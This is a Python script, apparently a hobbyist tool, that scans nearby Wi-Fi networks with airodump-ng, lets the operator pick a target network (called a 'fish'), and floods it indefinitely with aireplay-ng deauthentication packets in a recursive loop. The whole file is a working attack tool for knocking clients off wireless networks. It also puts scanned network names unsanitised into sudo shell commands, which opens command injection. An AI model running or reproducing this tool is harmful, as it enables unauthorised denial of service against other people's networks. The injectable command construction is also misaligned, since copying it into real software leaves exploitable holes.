import subprocess, time, sys, argparse, inquirer, re









red = "\033[1;31m"

green = "\033[1;32m"

yellow = "\033[1;33m"

blue = "\033[1;34m"









def deleteF():

    cmd = "sudo rm -rf ./wifi_-rble1-_DeAuPs/wifiInterFceCsv-02.csv ./wifi_-rble1-_DeAuPs/wifiInterFceCsv-01.csv ./wifi_-rble1-_DeAuPs/cltNmeCsv.py ./wifi_-rble1-_DeAuPs/wifiBssid.py ./wifi_-rble1-_DeAuPs/wifiChannel.py ./wifi_-rble1-_DeAuPs/wifiInterF.txt ./wifi_-rble1-_DeAuPs/essidColt.py ./wifi_-rble1-_DeAuPs/wifiChnelSts.py"

    subprocess.run( cmd, shell = True, check = True )









def downLine( t = 12 ):

    sTime = time.time()

    length = 30

    while time.time() - sTime <= t:

        eTime = time.time() - sTime

        p = eTime / t

        line = f"\r{ green }Program is fishing 🎣: { '-' * int( length * p ):{ length }s} { int( p * 101 ) }%"

        sys.stdout.write( line )

        sys.stdout.flush()

        time.sleep( 0.1 )









def iwCh( channel, interface ):

    try:

        cmd = f"sudo iwconfig { interface } channel { channel }"

        subprocess.run( cmd, shell = True, check = True )

    except:

        print( f"\n\n{ red }Getting error in setting channel on { interface }!\nLet him fish again!\n\n" )

        deleteF()

        sys.exit( 0 )









def kiddDeAuth( BSSID, interface, ESSID ):

    try:

        print( f"\n\n{ red }Program is roasting the { ESSID } fish!\n\n" )

        chkErrF = open( "./wifi_-rble1-_DeAuPs/wifiChnelSts.py", "w" )

        cmd = [ "sudo", "aireplay-ng", "-0", "0", "-a", BSSID, interface ]

        p = subprocess.Popen( cmd, stdout = chkErrF, stderr = subprocess.PIPE )

        time.sleep( 25 )

        p.terminate()

        p.wait()

        time.sleep( 1 )

        try:

            radChkErrF = open( "./wifi_-rble1-_DeAuPs/wifiChnelSts.py", "r" )

            txt = radChkErrF.read().strip()

            try:

                ap = re.findall( r"but the AP uses channel (\S+)", txt, re.IGNORECASE )[ 0 ]

                AP = ap.strip()

                if type( int( AP ) ) == int or AP:

                    iwCh( AP, interface )

                time.sleep( 1 )

                print( f"\n\n{ yellow }Program caught and reset the changed channel.\n\n" )

            except:

                print( f"\n\n{ green }Channel is set correctly\n\n" )

            try:

                noBssid = re.findall( r"No such BSSID available", txt, re.IGNORECASE )[ 0 ]

                if noBssid.lower() == "no such bssid available" or noBssid:

                    print( f"\n\n{ yellow }No BSSID caution is appearing!\n\n" )

                    air( interface, ESSID )

            except:

                print( f"\n\n{ green }BSSID is available\n\n" )

        except:

            print( f"\n\n{ yellow }wifiChnelSts file is missing!\n\n" )

        print( f"\n\n{ green }Taking a nap 💤\n\n" )

        time.sleep( 6 )

        kiddDeAuth( BSSID, interface, ESSID )

    except:

        deleteF()

        print( f"\n{ red }Stop sending DeAuth and files created by this script have been deleted!\n" )

        sys.exit( 0 )









def air( IF, rstEssid = None ):

    clrCmd = "sudo clear"

    subprocess.run( clrCmd, shell = True, check = True )

    delMkDirCmd = "rm -rf wifi_-rble1-_DeAuPs"

    subprocess.run( delMkDirCmd, shell = True, check = True )

    mkDirCmd = "sudo mkdir wifi_-rble1-_DeAuPs"

    subprocess.run( mkDirCmd, shell = True, check = True )

    time.sleep( 0.2 )

    lst = []

    csvLst = []

    rmLst = [ "AUTH", "ESSID", "PSK", "OPN", "0>" ]

    dic = {}

    fTxt = open( "./wifi_-rble1-_DeAuPs/wifiInterF.txt", "w" )

    fCsv = open( "./wifi_-rble1-_DeAuPs/wifiInterFceCsv-01.csv", "w" )

    cmd = [ "sudo", "airodump-ng", "-i", IF ]

    esidCsvCmd = [ "sudo", "airodump-ng", "-w", "./wifi_-rble1-_DeAuPs/wifiInterFceCsv", "--output-format", "csv", IF ]

    p = subprocess.Popen( cmd, stdout = fTxt )

    csvPrcs = subprocess.Popen( esidCsvCmd, stdout = fCsv )

    downLine()

    p.terminate()

    csvPrcs.terminate()

    p.wait()

    csvPrcs.wait()

    if rstEssid == None:

        essidCmd = "sudo awk '{print $11, $12, $13, $14, $15, $16, $17, $18, $19 $20}' ./wifi_-rble1-_DeAuPs/wifiInterF.txt | sort -u > ./wifi_-rble1-_DeAuPs/essidColt.py"

        subprocess.run( essidCmd, shell = True, check = True )

        time.sleep( 0.2 )

        with open( "./wifi_-rble1-_DeAuPs/essidColt.py", "r" ) as f:

            for readL in f:

                mdWrd = readL.strip()

                for y in rmLst:

                    mdWrd = mdWrd.replace( y, "" )

                lst.append( mdWrd.strip() )

        clnData = [ re.sub( r"\x1b\[.*?K", "", x ) for x in lst ]

        clnData1 = [ x.strip() for x in clnData if x.strip() != "" ]

        resultLst = set( clnData1 )

        cltCsvCmd = "sudo awk -F',' '{if ($1 ~ /Station/ || $1 ~ /BSSID/) next; print $14}' ./wifi_-rble1-_DeAuPs/wifiInterFceCsv-02.csv | sort -u > ./wifi_-rble1-_DeAuPs/cltNmeCsv.py"

        subprocess.run( cltCsvCmd, shell = True, check = True )

        radCsvF = open( "./wifi_-rble1-_DeAuPs/cltNmeCsv.py", "r" )

        while radCsvF.readline():

            csvLst.append( radCsvF.read().strip() )

        nameStr = " ".join( csvLst )

        vldNme = nameStr.split( "\n" )

        esidNme = [ x.strip() for x in vldNme if x.strip() ]

        essidName = set( esidNme )

        existEsid = list( resultLst.intersection( essidName ) )

        if len( existEsid ) != 0:

            realEssid = list( essidName )

            tile = f"Choose a fish name in { len( realEssid ) }"

            wihOne = [ inquirer.List( "opt", message = tile, choices = realEssid ) ]

            wifiName = inquirer.prompt( wihOne )[ "opt" ]

            dic[ "fishName" ] = wifiName

            dic[ "ESSID" ] = wifiName.lower()

        else:

            air( IF )

    else:

        dic[ "ESSID" ] = rstEssid.lower()

        dic[ "fishName" ] = rstEssid

    ESSID = dic[ "ESSID" ]

    cmd1 = "sudo grep -i '%s' ./wifi_-rble1-_DeAuPs/wifiInterF.txt | head -n 1 | awk '{ print $2 }' > ./wifi_-rble1-_DeAuPs/wifiBssid.py" % ESSID

    cmd2 = "sudo grep -i '%s' ./wifi_-rble1-_DeAuPs/wifiInterF.txt | head -n 1 | awk '{ print $7 }' > ./wifi_-rble1-_DeAuPs/wifiChannel.py" % ESSID

    subprocess.run( cmd1, shell = True, check = True )

    time.sleep( 0.2 )

    subprocess.run( cmd2, shell = True, check = True )

    time.sleep( 0.2 )

    try:

        bFile = open( "./wifi_-rble1-_DeAuPs/wifiBssid.py", "r" )

        cFile = open( "./wifi_-rble1-_DeAuPs/wifiChannel.py", "r" )

        bssid = bFile.read().strip()

        chnel = cFile.read().strip()

        if bssid == "" or chnel == "":

            print( f"\n\n{ yellow }1. Run the script in a full-screen terminal\n\n2. Ensure your IF is in monitor mode.\n\n" )

            sys.exit( 0 )

        else:

            bigFishName = dic[ "fishName" ]

            print( f"\n\n\n{ green }🐟 { bigFishName } fish on!\n\n" )

            dic[ "bssid" ] = bssid

            dic[ "channel" ] = chnel

    except:

        print( f"\n\n{ red }wifiBssid or wifiChannel files are not found!\n\n" )

        deleteF()

        sys.exit( 0 )

    iwCh( dic[ "channel" ], IF )

    kiddDeAuth( dic[ "bssid" ], IF, dic[ "fishName" ] )









def main():

    creOpt = argparse.ArgumentParser( description = "How to use?" )

    creOpt.add_argument( "-i", "--interface", type = str, required = True, help = "Network interface" )

    opt = creOpt.parse_args()

    air( opt.interface )









if __name__ == "__main__":

    main()
